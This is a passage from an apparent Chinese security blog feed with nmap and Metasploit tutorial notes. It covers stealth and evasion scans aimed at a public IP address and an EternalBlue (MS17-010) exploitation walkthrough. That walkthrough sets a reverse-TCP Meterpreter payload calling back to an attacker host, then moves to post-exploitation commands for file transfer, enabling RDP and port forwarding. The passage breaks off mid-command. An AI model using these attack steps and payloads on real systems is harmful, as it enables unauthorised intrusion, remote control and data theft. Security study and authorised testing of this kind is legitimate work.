FIN扫描</h3><p>向目标端口发送一个FIN数据包，按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sF 45.32.8.31</span><br></pre></td></tr></table></figure></p><h3 id="NULL-扫描"><a href="#NULL-扫描" class="headerlink" title="NULL 扫描"></a>NULL 扫描</h3><p>向目标端口发送一个不包含任何标志的数据包。按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sN 45.32.8.31</span><br></pre></td></tr></table></figure></p><h3 id="Xmas-Tree-扫描"><a href="#Xmas-Tree-扫描" class="headerlink" title="Xmas Tree 扫描"></a>Xmas Tree 扫描</h3><p>向目标端口发送一个含有FIN URG PUSH标志的数据包。按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sX 45.32.8.31</span><br><span class="line">``` </span><br><span class="line">### idle扫描  </span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">nmap -Pn -p- -sI 第三方主机 目标主机</span><br></pre></td></tr></table></figure></p><h2 id="扫描指定的端口"><a href="#扫描指定的端口" class="headerlink" title="扫描指定的端口"></a>扫描指定的端口</h2><p>1.扫描常见的100个端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -F 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>2.指定一个端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 80 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>3.使用名字来制定扫描端口。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap  -p smtp,http 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>4.扫描常用端口<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --top-ports  45.32.8.31</span><br><span class="line">``` </span><br><span class="line"><span class="comment"># 远程操作系统和服务 </span></span><br><span class="line">```bash</span><br><span class="line">-O 对操作系统扫描 </span><br><span class="line">-A 操作系统探测和服务发现</span><br><span class="line">-sV 服务和版本检测</span><br><span class="line">--allports  不为版本探测时排除任何端口  </span><br><span class="line">--version-intensity&lt;intensity&gt; -sV 探测报文的轻度值，默认为7 范围0~9 </span><br><span class="line">--version-all 尝试每个探测  相当于version-intensity 9</span><br><span class="line">--version-trace 跟踪版本扫描活动。 是--packet-trace 所得到的子集</span><br></pre></td></tr></table></figure></p><h1 id="nmap的高级使用"><a href="#nmap的高级使用" class="headerlink" title="nmap的高级使用"></a>nmap的高级使用</h1><p>1.对nmap发送的探测数据包进行分段。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -f 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>2.最大传输单元（MTU）是指一种通信协议的某层桑面所能通过的最大数据包大小（字节为单位），以太网的默认值为1500bytes.<br>这里的mtu的值必须8的倍数<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -mtu 16 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>3.使用诱饵主机隐蔽扫描<br>作为诱饵主机必须处于工作状态，否则就变成洪水攻击。在进行版本检测或tcp连接扫描时，诱饵扫描无效。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -D RND:4 45.32.8.31</span><br><span class="line">``` </span><br><span class="line">```bash</span><br><span class="line">nmap -D 192.168.1.214 45.32.8.31</span><br><span class="line">``` </span><br><span class="line">4.源端口欺骗  </span><br><span class="line">网络安全控制中有一种访问控制列表技术，依靠ip地址和端口来对数据包进行限制。</span><br><span class="line">可以通过--<span class="built_in">source</span>-port或-g指定源端口,来突破检测机制。 </span><br><span class="line">```bash</span><br><span class="line">namp -g 53 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>5.发送报文时附加随机数据<br>默认情况下nmap发送的报文中只包含头部，内容部分是空的，因此tcp数据包的大小只有40字节，而ICMP ECHO 请求只有28个字节。这种内容为空的报文很容易被目标网络检测机制所发现。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --data-length 20 45.32.8.31</span><br><span class="line">``` </span><br><span class="line">6.设置IP time-to-live域</span><br><span class="line">```bash</span><br><span class="line">nmap -ttl 25 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>7.MAC地址欺骗<br>使用字符串“0” 将简单选择一个完全随机的MAC地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn --spoof-mac 0 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>8.扫描结果保存<br>1）文件本件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -oN <span class="string">"d:\\test.txt"</span> 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>2）xml文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -oX &quot;d:\\test.xml&quot; 45.32.8.31</span><br></pre></td></tr></table></figure><p>3)grep文件之中<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -oG  <span class="string">"d:\\test.grep"</span> 45.32.8.31</span><br></pre></td></tr></table></figure></p><h1 id="nse脚本"><a href="#nse脚本" class="headerlink" title="nse脚本"></a>nse脚本</h1><ol><li>分类   </li></ol><table><thead><tr><th>分类</th><th>描述</th></tr></thead><tbody><tr><td>auth</td><td>包含的都是负责处理鉴权证书(绕开鉴权)的脚本</td></tr><tr><td>broadcast</td><td>在局域网内探查更多服务开启状况，如CHCP DNS SQL Sever等服务的脚本</td></tr><tr><td>brute</td><td>针对常见的应用，如HTTP/FTP等使用暴力破解密码的脚本</td></tr><tr><td>default</td><td>这是使用-sC和-A参数扫描时默认的脚本，提供基本脚本扫描能力</td></tr><tr><td>discovery</td><td>对网络进行更多的信息收集，如SMB收集、SNMP查询等</td></tr><tr><td>dos</td><td>用来发起拒绝服务攻击的脚本</td></tr><tr><td>exploit</td><td>用来完成对目标系统安全漏洞渗透的脚本</td></tr><tr><td>external</td><td>针对第三方服务的脚本</td></tr><tr><td>fuzzer</td><td>进行模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</td></tr><tr><td>intrusive</td><td>可能会引起目标系统崩溃或者对目标网络造成极大负担的脚本。这类脚本很容易被对方的防火墙或者IDS发现</td></tr><tr><td>malware</td><td>用来检测恶意软件的脚本 </td></tr><tr><td>safe</td><td>在任何情况下都是安全无害的脚本</td></tr><tr><td>version</td><td>负责增强服务与版本扫描功能的脚本</td></tr><tr><td>vuln</td><td>负责检查目标机是否有常见的漏洞 </td></tr></tbody></table><p>2.脚本的使用<br>调用一个脚本<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script smb-vuln-ms17-010.nse 192.168.1.0/24</span><br></pre></td></tr></table></figure></p><p>调用一个分类<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script discovery 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>3.脚本的应用<br>1)修改nmap默认的客户端,使用脚本判断服务器所支持的http方法。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script http-methods --script-args http.useragent=<span class="string">"Mozilla 42"</span> 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>4.nse脚本规则<br>1）Prerule()规则，这个规则的执行要早于nmap的扫描，因此这类脚本不会调用nmap扫描得到的任何结果。执行的顺序是先脚本，后nmap扫描<br>2）Hostrule()规则，这个规则实在nmap已经完成了主机的发现之后执行的，根据主机发现的结果来触发该类脚本。执行的顺序是先nmap发现，后脚本。<br>3）Portrule(）规则，执行了端口扫描或版本侦测时才会触发的脚本，这个规则的执行与端口的状态联系紧密。执行的顺序是先nmap端口扫描后脚本。<br>4）Postrule(）规则，但所有的扫描都结束以后才会执行的脚本。<br>3.一个不错nse脚本编译工具Halcyon<br>5.将写的脚本添加到nmap中：将写好的 <code>*.nes</code> 文件 放在nmap安装目录的scripts文件夹中，再nmap中运行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Nmap --script-updatedb</span><br></pre></td></tr></table></figure></p><p>5.<a href="http://www.runoob.com/lua/lua-environment.html" target="_blank" rel="noopener">lua语言</a>   </p><h1 id="nse中的api"><a href="#nse中的api" class="headerlink" title="nse中的api"></a>nse中的api</h1><p>nmap中的api的核心功能就是向脚本提供关于主机和端口的信息。<br>nmap引擎会向脚本传递乳腺连个Lua table类型的参数：<br>host table<br>port table </p><h2 id="host-table"><a href="#host-table" class="headerlink" title="host table"></a>host table</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">host.os          包含目标的操作系统类型   </span><br><span class="line">host.ip          包含了目标的ip的地址   </span><br><span class="line">host.nmae        包含了目标的反向dns主机名  </span><br><span class="line">host.targetname  包含了目标主机在命令行中的名字    </span><br><span class="line">host.directly_connected 目标计算机是否与我们同在一个子网 </span><br><span class="line">host.mac_addr 目标的mac地址，只有处于同于网段才有效 </span><br><span class="line">host.mac_addr_src    使用的计算机的mac地址 </span><br><span class="line">host.interface_mtu 网络中的MTU的值</span><br><span class="line">host.bin_ip  目标的ip地址 </span><br><span class="line">host.bin_ip_src </span><br><span class="line">host.times  目标的时序数据</span><br><span class="line">host.traceroute 只有在指定--traceroute</span><br></pre></td></tr></table></figure><h2 id="port-table"><a href="#port-table" class="headerlink" title="port table"></a>port table</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">port.number 标识了目标端口的编号</span><br><span class="line">port.protocol 目标端口的类型udP或tcp </span><br><span class="line">port.service 保存了端口上运行的服务</span><br><span class="line">port.version 通过服务扫描发现的版本信息，需要-sV扫描  </span><br><span class="line">port.state 保存了端口上运行的状态</span><br></pre></td></tr></table></figure><h1 id="nse的库文件"><a href="#nse的库文件" class="headerlink" title="nse的库文件"></a>nse的库文件</h1><p>这些库文件实现了代码分离和重构，涵盖了几乎当前所有的流行的协议、常见的字符串处理操作，甚至包含了用来实现对用户名和密码进行破解的brute库文件。     </p><h2 id="常见的Nse库文件"><a href="#常见的Nse库文件" class="headerlink" title="常见的Nse库文件"></a>常见的Nse库文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">shortport    收集常见的端口规则信息</span><br><span class="line">comm      与目标机进行通信，数据交换 </span><br><span class="line">http     完成所有对http的相关安全检测操作  </span><br><span class="line">stdNSE   包含了NSE开发中各种有用的功能，涉及与定时、 并发、输出和字符串处理相关 的函数。   </span><br><span class="line">openSSL 用来绑定OpenSSL的借口，主要用来进行加密。</span><br><span class="line">target 这个库的主要目的是管理新发现目标的扫描队列</span><br><span class="line">creds 用来保存脚本在执行时发现的登录凭证   </span><br><span class="line">vluns  提供关于主机的安全漏洞方面的消息</span><br></pre></td></tr></table></figure><h1 id="nse中的数据文件"><a href="#nse中的数据文件" class="headerlink" title="nse中的数据文件"></a>nse中的数据文件</h1><p>指定数据目录的所在位置<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --datadir D:\office\nmap-7.60\nselib\data -sC -sV 45.32.8.31</span><br></pre></td></tr></table></figure></p><p>nmap选择数据文件的顺序<br>优先级1：选项–datadir所指定的目录<br>2：环境变量所指定的位置<br>3：安装目录<br>4：在编译时定义的目录   </p><h2 id="web审计数据文件"><a href="#web审计数据文件" class="headerlink" title="web审计数据文件"></a>web审计数据文件</h2><p>1.http-fingerprints.lua<br>这个文件时一个lua table形式保存的数据文件，在这个文件中包含了一些常见的web应用信息，包含这些用用中关键文件所在的位置<br>2.http-sql-error.list<br>包含一些标识错误的字符串，主要被脚本http-sql-injection所使用。<br>3.http-web-files-extensions.lst<br>http-spider库文件在对页面进行扫描的过程 中狗就会使用该文件。包含了200多个常见的web应用扩展名。<br>4.http-devframework-fingerprints.lua<br>检测目标web应用所使用的语言<br>5.http-folders.txt<br>包含了九百多个HTTP常见的目录名，被脚本http-iis-webdav-vuln所调用，检测iis5/6类型服务器上传漏洞<br>6.vhosts-default.lst<br>脚本http-vhosts用这个数据文件来判断目标服务器是一个虚拟机还是一个真正的web服务器<br>7.wp-plugins.lst<br>包含了五万多个常见的wordpress初见的名称，脚本http-wordpress-plugins 利用此文件来对采用wordpress建站的服务器进行暴力穷举攻击<br>如果不特殊指定–srcipt-args http-wordpress-plungins.search ，此脚本只会读取前100个   </p><h2 id="DBMS-auding数据文件"><a href="#DBMS-auding数据文件" class="headerlink" title="DBMS-auding数据文件"></a>DBMS-auding数据文件</h2><p>1.mysql-cis.audit<br>主要根据CIA MYSQL V1.0.2 benchmark来检测mysql数据库的配置安全性。 mysql-audit脚本就是用了这个文件。<br>2.oracle-default-accounts.lst<br>用来验证oracle数据库的用户名。 被oracle-brute 和oracle-brute-stealth两个脚本所调用<br>3.oracle-sids<br>包含了常见的 oracle数据库实例名  </p><h1 id="namp脑图"><a href="#namp脑图" class="headerlink" title="namp脑图"></a>namp脑图</h1><p><img src="/posts/../../images/naotu/nmap.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;nmap主机端口开发探测神器，一直在使用它来主机发现和端口开放探测，不知道其原理，这次就来仔细地了解一下它的真面目。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具" scheme="http://note.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="渗透测试" scheme="http://note.cfyqy.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="工具" scheme="http://note.cfyqy.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>metasploit续</title>
    <link href="http://note.cfyqy.com/posts/9e35f352.html"/>
    <id>http://note.cfyqy.com/posts/9e35f352.html</id>
    <published>2018-04-28T13:19:00.000Z</published>
    <updated>2018-09-18T09:30:34.286Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1域名、dns信息收集<br>1)whois查询<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whois 域名|ip</span><br></pre></td></tr></table></figure></p><p>2)nslookup<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup 域名</span><br></pre></td></tr></table></figure></p><p>2.nmap<br>1)隐秘的tcp扫描和不ping。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -Pn ip</span><br></pre></td></tr></table></figure></p><p>2)Tcp空闲扫描<br>window上运行metasploit，线程数最好不要超过16，UXNIX平台上不要超过128<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq </span><br><span class="line">msf auxiliary(ipidseq) &gt; show options</span><br><span class="line">msf auxiliary(ipidseq) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(ipidseq) &gt; set threads 60</span><br><span class="line">threads =&gt; 60</span><br><span class="line">msf auxiliary(ipidseq) &gt; run</span><br></pre></td></tr></table></figure></p><p>发现空闲主机192.168.2.5可用于空闲扫描，对目标机进行扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf auxiliary(ipidseq) &gt;nmap -PN -sI 192.168.2.5 192.168.2.8</span><br></pre></td></tr></table></figure></p><p>3)msf中的db_nmap<br>4)查看metasploit的端口扫描工具<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; search portscan</span><br></pre></td></tr></table></figure></p><p>3.针对性扫描<br>1）服务器消息块协议扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure></p><p>2）搜寻配置不当的mssql<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping  </span><br><span class="line">msf auxiliary(mssql_ping) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(mssql_ping) &gt; set threads 255</span><br><span class="line">threads =&gt; 255</span><br><span class="line">msf auxiliary(mssql_ping) &gt; run</span><br></pre></td></tr></table></figure></p><p>3）ssh服务器扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;search ssh_version</span><br></pre></td></tr></table></figure></p><p>4)FTP扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version   </span><br><span class="line">msf auxiliary(ftp_version) &gt; set threads 255</span><br><span class="line">threads =&gt; 255</span><br><span class="line">msf auxiliary(ftp_version) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(ftp_version) &gt; run</span><br></pre></td></tr></table></figure></p><p>5)简单的网络管理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search snmp_login</span><br></pre></td></tr></table></figure></p><h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a><a href="https://blog.csdn.net/chengyu779394084/article/details/50602459" target="_blank" rel="noopener">漏洞扫描</a></h1><p>1.nexpose  </p><p>2.nessus<br>3.扫描开放的vnc空口令<br>最新版的vnc服务器不再允许使用空口令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use  auxiliary/scanner/vnc/vnc_none_auth</span><br></pre></td></tr></table></figure></p><p>4.扫描开放的x11服务器<br>x11在新的操作系统上不再使用的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/x11/open_x11</span><br></pre></td></tr></table></figure></p><p>2.利用扫描结果进行自动化攻击  </p><p>利用autopwn自动攻击(不建议）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;db_connect postgres:toor@127.0.0.1/msf1</span><br><span class="line">db_import /root/nessus.nbe</span><br><span class="line">db_autopwn -e -t -r -x -p</span><br></pre></td></tr></table></figure></p><h1 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h1><p>1.渗透攻击基础 </p><p>msf中的命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;?</span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    advanced      Displays advanced options for one or more modules</span><br><span class="line">    back          Move back from the current context</span><br><span class="line">    banner        Display an awesome metasploit banner</span><br><span class="line">    cd            Change the current working directory</span><br><span class="line">    color         Toggle color</span><br><span class="line">    connect       Communicate with a host</span><br><span class="line">    edit          Edit the current module with $VISUAL or $EDITOR</span><br><span class="line">    exit          Exit the console</span><br><span class="line">    get           Gets the value of a context-specific variable</span><br><span class="line">    getg          Gets the value of a global variable</span><br><span class="line">    grep          Grep the output of another command</span><br><span class="line">    help          Help menu</span><br><span class="line">    info          Displays information about one or more modules</span><br><span class="line">    irb           Drop into irb scripting mode</span><br><span class="line">    jobs          Displays and manages jobs</span><br><span class="line">    kill          Kill a job</span><br><span class="line">    load          Load a framework plugin</span><br><span class="line">    loadpath      Searches for and loads modules from a path</span><br><span class="line">    makerc        Save commands entered since start to a file</span><br><span class="line">    options       Displays global options or for one or more modules</span><br><span class="line">    popm          Pops the latest module off the stack and makes it active</span><br><span class="line">    previous      Sets the previously loaded module as the current module</span><br><span class="line">    pushm         Pushes the active or list of modules onto the module stack</span><br><span class="line">    quit          Exit the console</span><br><span class="line">    reload_all    Reloads all modules from all defined module paths</span><br><span class="line">    rename_job    Rename a job</span><br><span class="line">    resource      Run the commands stored in a file</span><br><span class="line">    route         Route traffic through a session</span><br><span class="line">    save          Saves the active datastores</span><br><span class="line">    search        Searches module names and descriptions</span><br><span class="line">    sessions      Dump session listings and display information about sessions</span><br><span class="line">    set           Sets a context-specific variable to a value</span><br><span class="line">    setg          Sets a global variable to a value</span><br><span class="line">    show          Displays modules of a given type, or all modules</span><br><span class="line">    sleep         Do nothing for the specified number of seconds</span><br><span class="line">    spool         Write console output into a file as well the screen</span><br><span class="line">    threads       View and manipulate background threads</span><br><span class="line">    unload        Unload a framework plugin</span><br><span class="line">    unset         Unsets one or more context-specific variables</span><br><span class="line">    unsetg        Unsets one or more global variables</span><br><span class="line">    use           Selects a module by name</span><br><span class="line">    version       Show the framework and console library version numbers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    creds             List all credentials in the database</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br></pre></td></tr></table></figure></p><p>可用的渗透攻击模块<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;show exploits</span><br></pre></td></tr></table></figure></p><p>可用的辅助模块<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;show auxiliary</span><br></pre></td></tr></table></figure></p><p>可用的攻击载荷<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure></p><p>2.永恒之蓝的利用<br>1)metasploit没有的集成的话去下载，或者更新到最新的。<br>ms17_010扫描模块的安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop# cp smb_ms17_010.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/</span><br></pre></td></tr></table></figure></p><p>漏洞利用脚本的安装<br>把模块下载到对应的目录(kali下metasploit存放模块的目录是/usr/share/metasploit-framework/modules/)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/modules/exploits/windows/smb/ </span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-</span><br><span class="line">framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb</span><br></pre></td></tr></table></figure></p><p>2)漏洞扫描<br>nmap针对漏洞脚本的定向扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -n -p445 --script smb-vuln-ms17-010 192.168.1.0/24 --open</span><br></pre></td></tr></table></figure></p><p>或者使用smb_ms17_010<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010 # 调用漏洞扫描模块</span><br><span class="line">show option # 查看模块配置选项</span><br><span class="line">set RHOST 192.168.1.1-254 # 配置扫描目标</span><br><span class="line">set THREADS 30 #配置扫描线程</span><br><span class="line">run #运行脚本</span><br></pre></td></tr></table></figure></p><p>3)开始攻击<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt; use exploit/windows/smb/ms17_010_eternalblue # 调用ms17-010永恒之蓝漏洞攻击模块</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show targets #查看攻击的有效对象</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; info #查看详细信息 </span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; setg rhost 192.168.2.5 # 设定全局变量的攻击目标 192.168.2.5</span><br><span class="line">rhost =&gt; 192.168.2.5</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp # 调用反弹的攻击载荷</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; set lhost 192.168.2.3 # 设定将meterpreter反弹给192.168.2.3</span><br><span class="line">lhost =&gt; 192.168.2.3</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; show options  # 查询攻击参数设置</span><br></pre></td></tr></table></figure></p><h1 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h1><p>1.常见命令<br>基本命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">background  # 让meterpreter处于后台模式  </span><br><span class="line">sessions -i index   # 与会话进行交互，index表示第一个session  </span><br><span class="line">quit  # 退出会话  </span><br><span class="line">shell # 获得控制台权限  </span><br><span class="line">irb # 开启ruby终端</span><br><span class="line">ps # 查看当前活跃进程  </span><br><span class="line">migrate  pid # 将Meterpreter会话移植到进程数位pid的进程中  </span><br><span class="line">kill pid # 杀死进程  </span><br><span class="line">getpid # 获取当前进程的pid  </span><br><span class="line">sysinfo # 查看目标机系统信息，如机器名，操作系统等  </span><br><span class="line"></span><br><span class="line">shutdown # 关机</span><br></pre></td></tr></table></figure><p>截屏<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;screenshot</span><br></pre></td></tr></table></figure></p><p>系统运行的平台信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;sysinfo</span><br></pre></td></tr></table></figure></p><p>查看进程和进程转移<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps       </span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure></p><p> 查看权限<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p><p>获取目标机器的工作目录和得到当前系统的工作目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getwd  </span><br><span class="line">C:\Windows\system32</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getlwd </span><br><span class="line">/root</span><br></pre></td></tr></table></figure></p><p>上传文件到目标主机和下载目标文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload /root/1.txt c:\\</span><br><span class="line">[*] uploading  : /root/1.txt -&gt; c:\</span><br><span class="line">[*] uploaded   : /root/1.txt -&gt; c:\\1.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download c:/2.txt /root </span><br><span class="line">[*] Downloading: c:/2.txt -&gt; /root/2.txt</span><br><span class="line">[*] Downloaded 5.00 B of 5.00 B (100.0%): c:/2.txt -&gt; /root/2.txt</span><br><span class="line">[*] download   : c:/2.txt -&gt; /root/2.txt</span><br></pre></td></tr></table></figure></p><p>搜索目标主机上的文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; search -h </span><br><span class="line">Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...</span><br><span class="line">Search for files.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d &lt;opt&gt;  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )</span><br><span class="line">    -f &lt;opt&gt;  A file pattern glob to search for. (e.g. *secret*.doc?)</span><br><span class="line">    -h        Help Banner.</span><br><span class="line">    -r &lt;opt&gt;  Recursivly search sub directories. (Default: true)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; search -d c:\\  -r flase -f *.txt</span><br><span class="line">Found 2 results...</span><br><span class="line">    c:\1.txt (2 bytes)</span><br><span class="line">    c:\2.txt (5 bytes)</span><br></pre></td></tr></table></figure></p><p>确定是不是虚拟机<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm  </span><br><span class="line"></span><br><span class="line">[*] Checking if WIN-VONVJ6OMEQ7 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br></pre></td></tr></table></figure></p><p>开3389<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line"></span><br><span class="line">[*] Enabling Remote Desktop</span><br><span class="line">[*] RDP is disabled; enabling it ...</span><br><span class="line">[*] Setting Terminal Services service startup mode</span><br><span class="line">[*] The Terminal Services service is not set to auto, changing it to auto ...</span><br><span class="line">[*] Opening port in local firewall if necessary</span><br><span class="line">[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20180430181213_default_192.168.1.187_host.windows.cle_516653.txt</span><br><span class="line">meterpreter &gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Connection list</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Proto  Local address        Remote address      State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------        --------------      -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:135          0.0.0.0:*           LISTEN       0     0      696/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:445          0.0.0.0:*           LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:3389         0.0.0.0:*           LISTEN       0     0      1040/svchost.exe</span><br></pre></td></tr></table></figure></p><p>远程主机的3389的端口映射到本机的1235号端口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1234 -r 192.168.1.187 -p 3389</span><br><span class="line">[*] Local TCP relay created: :1234 &lt;-&gt; 